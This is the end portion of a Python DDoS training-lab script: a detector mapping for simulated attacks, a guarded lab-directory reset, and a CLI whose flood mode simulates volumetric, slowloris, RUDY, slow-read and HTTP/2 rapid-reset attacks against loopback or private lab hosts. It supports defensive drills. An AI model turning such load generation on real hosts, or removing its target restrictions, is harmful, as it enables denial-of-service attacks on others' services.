   - Have an incident runbook: who declares, who calls the upstream provider,
     how you fail over. A drill like this is a good time to rehearse it.

TABLETOP MAPPING (lab event -> what the detector should see)
   baseline_captured             -> your quiet-hour baseline for rate/conns
   traffic_window (high rps)      -> volumetric spike in flow/request metrics
   traffic_window (high conns)    -> connection-table growth (slowloris)
   rate_threshold_exceeded        -> volumetric/HTTP-flood alert fires
   connection_threshold_exceeded  -> connection-exhaustion alert fires
   reset_flood_threshold_exceeded -> HTTP/2 rapid-reset (CVE-2023-44487) alert
   victim_metrics_final           -> post-incident summary (peak rps, p95, etc.)
"""


def detect() -> None:
    print(DETECTION_GUIDE)


# --------------------------------------------------------------------------- #
# Reset (guarded).
# --------------------------------------------------------------------------- #

LAB_MARKERS = ("events.jsonl",)


def reset(lab: Path) -> None:
    lab = lab.resolve()
    if not lab.exists():
        print(f"nothing to remove; {lab} does not exist")
        return

    dangerous = {Path.home().resolve(), Path.cwd().resolve()} | set(
        Path(lab.anchor).resolve().parents
    )
    dangerous.add(Path(lab.anchor).resolve())  # drive/filesystem root
    if lab in dangerous or (lab / ".git").exists():
        raise SystemExit(
            f"refusing to delete {lab}: it is not a lab directory "
            "(looks like your home, cwd, a filesystem root, or a git repo)"
        )
    looks_like_lab = lab == DEFAULT_LAB.resolve() or any(
        (lab / marker).exists() for marker in LAB_MARKERS
    )
    if not looks_like_lab:
        raise SystemExit(
            f"refusing to delete {lab}: it does not contain any lab files "
            f"({', '.join(LAB_MARKERS)}); delete it yourself if you are sure"
        )

    shutil.rmtree(lab)
    print(f"removed {lab}")


# --------------------------------------------------------------------------- #
# CLI.
# --------------------------------------------------------------------------- #


def main(argv: list[str] | None = None) -> None:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument(
        "mode", choices=["serve", "flood", "run", "report", "detect", "reset"]
    )
    parser.add_argument(
        "--lab-dir", type=Path,
        default=Path(os.environ.get(LAB_DIR_ENV, DEFAULT_LAB)),
        help=f"lab working directory (default: {DEFAULT_LAB})",
    )
    parser.add_argument(
        "--port", type=int, default=int(os.environ.get(PORT_ENV, DEFAULT_PORT)),
        help=f"port for the victim server (default: {DEFAULT_PORT})",
    )
    parser.add_argument(
        "--bind", default=HOST,
        help="address the victim server listens on (serve mode; default "
             "127.0.0.1). Use your lab IP or 0.0.0.0 with --allow-lan.",
    )
    parser.add_argument(
        "--target", default=HOST,
        help="address to send simulated load to (flood mode; default "
             "127.0.0.1). Must be a private/lab host; requires --allow-lan.",
    )
    parser.add_argument(
        "--allow-lan", action="store_true",
        help="permit binding/targeting your PRIVATE lab network instead of "
             "loopback only. Public/routable addresses are always refused.",
    )
    parser.add_argument(
        "--attack", choices=list(ATTACKS), default="volumetric",
        help="attack style to simulate (flood/run): volumetric, cachebust, "
             "connflood, bodyflood, rapidreset, slowloris, rudy, slowread",
    )
    parser.add_argument(
        "--workers", type=int, default=DEFAULT_WORKERS,
        help=f"simulated attacker workers (default {DEFAULT_WORKERS}, max {MAX_WORKERS})",
    )
    parser.add_argument(
        "--duration", type=int, default=DEFAULT_DURATION,
        help=f"seconds to generate load (default {DEFAULT_DURATION}, max {MAX_DURATION})",
    )
    parser.add_argument(
        "--alert-rps", type=int, default=DEFAULT_ALERT_RPS,
        help="requests/sec that fires the mock volumetric alert (serve/run)",
    )
    parser.add_argument(
        "--alert-conns", type=int, default=DEFAULT_ALERT_CONNS,
        help="concurrent conns that fires the mock slowloris alert (serve/run)",
    )
    parser.add_argument(
        "--announce", action="store_true",
        help="print a loud 'TRAINING SIMULATION -- SAFE' banner (run mode)",
    )
    parser.add_argument(
        "--gui", action="store_true",
        help="also show the banner as a popup window, if available (run mode)",
    )
    args = parser.parse_args(argv)

    lab: Path = args.lab_dir
    run_id = os.environ.get(RUN_ID_ENV) or uuid.uuid4().hex

    if args.mode == "serve":
        serve(
            lab, args.port, run_id, args.alert_rps, args.alert_conns,
            bind_host=args.bind, allow_lan=args.allow_lan,
        )
    elif args.mode == "flood":
        flood(
            lab, args.port, run_id, args.attack, args.workers, args.duration,
            target_host=args.target, allow_lan=args.allow_lan,
        )
    elif args.mode == "run":
        run(
            lab, args.port, run_id, args.attack, args.workers, args.duration,
            args.alert_rps, args.alert_conns,
            show_banner=args.announce, gui_banner=args.gui,
        )
    elif args.mode == "report":
        report(lab)
    elif args.mode == "detect":
        detect()
    else:
        reset(lab)


if __name__ == "__main__":
    main()
